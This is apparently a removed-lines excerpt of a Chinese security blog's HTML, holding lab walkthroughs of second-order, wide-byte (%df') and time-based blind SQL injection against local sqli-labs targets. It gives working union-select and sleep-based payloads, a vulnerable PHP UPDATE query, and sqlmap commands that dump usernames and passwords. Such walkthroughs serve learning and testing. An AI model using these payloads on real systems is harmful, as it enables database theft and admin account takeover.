-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-二次注入"><a href="#SQL注入-二次注入" class="headerlink" title="SQL注入-二次注入"></a>SQL注入-二次注入</h1><hr>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>二次注入是通过与数据库服务器进行交互的过程再次进行注入</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>用户输入恶意语句</p>
-<p>数据库把用户输入的数据没有做任何更改，直接进行了存储</p>
-<p>再用户取出数据的过程中，数据库将用户输入的数据完整且没有做任何修饰的展示给用户</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>常常发生在注册页面，插入恶意语句，在仅知道管理员的账号，但是不知道密码的情况下，改掉管理员的密码</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、一个登录界面，可进行更改密码、注册用户</p>
-<p><img src="https://img-blog.csdnimg.cn/20210410145002978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、查看数据库中原有的数据<br><img src="https://img-blog.csdnimg.cn/20210410145042112.png" alt="在这里插入图片描述"></p>
-<p>3、目的：改掉admin用户的密码</p>
-<p>4、注册用户</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册用户名为admin&#x27; -- q</span><br><span class="line">密码为<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410150507893.png" alt="在这里插入图片描述"><br>5、注册成功<br><img src="https://img-blog.csdnimg.cn/20210410150623996.png" alt="在这里插入图片描述"><br>6、查看数据库有无增加用户<br><img src="https://img-blog.csdnimg.cn/20210410150646738.png" alt="在这里插入图片描述"><br>7、使用用户名admin’ – q 登录<br>8、观察admin用户的密码为admin<br><img src="https://img-blog.csdnimg.cn/20210410151149324.png" alt="在这里插入图片描述"></p>
-<p>9、更改admin’ – q用户的密码为654321<br><img src="https://img-blog.csdnimg.cn/20210410150850863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410150911755.png" alt="在这里插入图片描述"></p>
-<p>10、再次查看数据库<br><img src="https://img-blog.csdnimg.cn/20210410150937662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到新注册的用户admin’ – q 密码没改变，admin用户的密码却更改为654321</p>
-<p>11、使用admin用户登录<br><img src="https://img-blog.csdnimg.cn/20210410151109648.png" alt="在这里插入图片描述"><br>登录成功</p>
-<h2 id="能够更改admin密码原理"><a href="#能够更改admin密码原理" class="headerlink" title="能够更改admin密码原理"></a>能够更改admin密码原理</h2><p>1、更改密码处的后端代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>2、当我们使用admin’ – q用户名 更改密码时 代码变为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27; -- q&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>username&#x3D;’admin’ – q’&#x3D;&#x3D;&gt;此处admin’构成闭合，用户名变为amdin用户，– q则注释了后面的单引号<br>故可以使用 用户名admin’ – q 密码123456 登录，然后更改用户名admin的密码</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-宽字节注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-11 19:39:41" itemprop="dateCreated datePublished" datetime="2022-11-11T19:39:41+08:00">2022-11-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:10" itemprop="dateModified" datetime="2023-03-07T21:29:10+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-宽字节注入"><a href="#SQL注入-宽字节注入" class="headerlink" title="SQL注入-宽字节注入"></a>SQL注入-宽字节注入</h1><hr>
-<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><p>GBK 编码 两个字节表示一个字符</p>
-<p>ASCII 编码 一个字节表示一个字符</p>
-<p>MYSQL默认字节集是GBK等宽字节字符集</p>
-<h2 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addslashes <span class="punctuation">(</span> string `$str` <span class="punctuation">)</span> <span class="operator">:</span> string</span><br><span class="line"></span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span><br><span class="line">这些字符是单引号（`&#x27;`）、双引号（`&quot;`）、反斜线（`\`）与 NUL（**`null`** 字符）。</span><br><span class="line"></span><br><span class="line">只要注入&#x27;  &quot;  \ 空字符 都会转义为 \&#x27;  \&quot; \\ \   </span><br><span class="line">魔术单引号同理【PHP5.4及其以上魔术引号是被删除了】</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>如果网站使用了 addslashes()函数函数或者开启了魔术单引号，恰巧MYSQL数据库为GBK，就会造成宽字节注入</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%DF</span>&#x27;:    </span><br><span class="line"></span><br><span class="line">- 会被PHP当中的addslashes函数转义为：<span class="variable">%DF</span>\&#x27;   </span><br><span class="line">- \ 会被URL编码为 <span class="variable">%5</span>C</span><br><span class="line">- 那么 <span class="variable">%DF</span>&#x27;  会被转义为 <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span></span><br><span class="line">- <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span>是一个宽字节 也就是一个縗&#x27;</span><br><span class="line">从而可以进行构造闭合，进行注入</span><br><span class="line">小技巧：有的时候我们也可以用<span class="number">16</span>进制来代替字符串</span><br></pre></td></tr></table></figure>
-
-<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>%27———单引号</p>
-<p>%20———-空格</p>
-<p>%23———–#号</p>
-<p>%5c————\反斜杠</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410123856157.png" alt="在这里插入图片描述"></p>
-<p>2、使用反斜杠进行探测<br>明明只输入了一个反斜杠，在查询语句中却出现了两个<br><img src="https://img-blog.csdnimg.cn/20210410124011684.png" alt="在这里插入图片描述"></p>
-<p>输入一个单引号却出现反斜杠+单引号<br><img src="https://img-blog.csdnimg.cn/20210410124145409.png" alt="在这里插入图片描述"></p>
-<p>3、有此可以判断，使用了转义函数addslashes()或者魔术引号，试一试可否进行宽字节注入<br>输入%df’，页面报错，好事情<br><img src="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在’后加上注释符– q<br>页面返回正常，存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410124738583.png" alt="在这里插入图片描述"><br>可知字段数为3</p>
-<p>6、使用联合查询，探测回显点<br>得到回显点2,3<br><img src="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>7、使用version()，查询数据库版本号<br><img src="https://img-blog.csdnimg.cn/20210410125041699.png" alt="在这里插入图片描述"><br>5.0以上版本，可以使用information_schema数据库得出数据</p>
-<p>8、使用limit依次爆出表名</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9、查看china_flag表下的字段名<br>使用联合查询时</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="attribute">id</span>=0%df&#x27; union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;china_flag&#x27;</span>-- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>此时可采用子查询的方式</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line">table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=</span><br><span class="line"> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410141019719.png" alt="在这里插入图片描述"><br>得到china_flag表下的Id和C_Flag字段</p>
-<p>10、使用limit依次爆出Id和C_Flag字段信息</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?id=<span class="number">0</span>%df&#x27; union select <span class="number">1</span>,Id,C_Flag from china_flag limit <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410141359608.png" alt="在这里插入图片描述"></p>
-<h1 id="SQLMap跑宽字节注入"><a href="#SQLMap跑宽字节注入" class="headerlink" title="SQLMap跑宽字节注入"></a>SQLMap跑宽字节注入</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在已知存在宽字节注入的情况下，可使用sqlmap的参数：</span><br><span class="line"> <span class="comment">--tamper  unmagicquotes.py</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">SQL注入-时间盲注</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-11 13:18:53" itemprop="dateCreated datePublished" datetime="2022-11-11T13:18:53+08:00">2022-11-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:28" itemprop="dateModified" datetime="2023-03-07T21:29:28+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-时间盲注"><a href="#SQL注入-时间盲注" class="headerlink" title="SQL注入-时间盲注"></a>SQL注入-时间盲注</h1><hr>
-<p>时间盲注也称为延时注入</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>如果说基于Boolean的盲注在页面上可以看到0 or 1 的回显，那么时间盲注完全啥都看不到，但可以通过特定的输入，判断后台的执行时间，从而确定注入</p>
-<h2 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h2><ul>
-<li><p>sleep() 让程序挂起，单位秒</p>
-</li>
-<li><p>if(condition,value_if_true,value_if_false)</p>
-<p>语法：当condition为真时，返回value_if_true，否则返回value_if_false</p>
-</li>
-<li><p>length() 获取字符串的长度</p>
-</li>
-<li><p>substr() 截取字符串</p>
-<p>语法：substr(string,num start,num length)</p>
-<p>string 字符串；start 起始位置(从1开始)；截取长度</p>
-</li>
-<li><p>ascii() 把字符转换为ascii码值</p>
-</li>
-</ul>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210409202345116.png" alt="在这里插入图片描述"><br>2、输出错误参数，页面无变化<br><img src="https://img-blog.csdnimg.cn/20210409202441968.png" alt="在这里插入图片描述"><br>3、加上 and sleep()函数 尝试让页面休眠10秒<img src="https://img-blog.csdnimg.cn/20210409203100421.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409203146716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>页面貌似延迟为2s</p>
-<p>没有执行sleep()函数，猜想会不会是字符串型，换为’ and sleep(10) – q<br><img src="https://img-blog.csdnimg.cn/20210409203333469.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409203418650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>执行成功，判断存在时间盲注</p>
-<p>4、探测if语句是否可以使用<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-9/?id=1">http://127.0.0.1/sqli/Less-9/?id=1</a>‘ and if(1&#x3D;2,sleep(20),null) – q<br><img src="https://img-blog.csdnimg.cn/20210409204538268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-9/?id=1">http://127.0.0.1/sqli/Less-9/?id=1</a>‘ and if(1&#x3D;1,sleep(20),null) – q<br><img src="https://img-blog.csdnimg.cn/20210409204707185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>5、if语句可以使用，进行判断版本号</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and if( length(substr(select version(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">5</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409205104427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>版本号为5.0版本以上</p>
-<p>6、判断当前数据库名</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) &gt;<span class="number">120</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409205743844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) &lt;<span class="number">120</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409205942466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="number">115</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409210159662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210409193957463.png" alt="在这里插入图片描述"><br>得知第一个单词为s</p>
-<p>按照以上步骤，依次猜解<br>最终得到当前数据库名为security</p>
-<p>7、其他信息与上述步骤同理，一个一个猜解<br>8、由于太过于费事费力，可以使用自动化工具SQLMap</p>
-<h2 id="SQLMap跑时间盲注"><a href="#SQLMap跑时间盲注" class="headerlink" title="SQLMap跑时间盲注"></a>SQLMap跑时间盲注</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用 --technique 指定SQLMap探测技术</span><br><span class="line">支持的探测方式有：</span><br><span class="line"> - <span class="keyword">B: </span>基于<span class="keyword">Boolean的盲注（Boolean </span><span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - Q: 内联查询（inlin queries） </span><br><span class="line"> - T:基于时间的盲注（time <span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - U: 联合查询（union query <span class="keyword">based） </span></span><br><span class="line"> - E: 错误（errorbased）</span><br><span class="line"> </span><br><span class="line"> -time-sec参数设定延时时间，默认是<span class="number">5</span>秒。</span><br></pre></td></tr></table></figure>
-
-<p>1、得出当前数据库名</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> --current-<span class="built_in">db</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409212346674.png" alt="在这里插入图片描述"></p>
-<p>2、得出security数据库下的表面</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> <span class="attr">--technique</span> T <span class="attr">--time-sec</span> <span class="number">3</span> -D security <span class="attr">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/2021040921464930.png" alt="在这里插入图片描述"></p>
-<p>3、跑 users表下面的字段</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> -D security -<span class="built_in">T</span> users</span><br><span class="line"> --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409212137686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>4、跑出跑出users表中跑出id、username、password字段数据</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> -D security -<span class="built_in">T</span> users</span><br><span class="line"> -C id,username,password --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409212101436.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/10/SQL%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
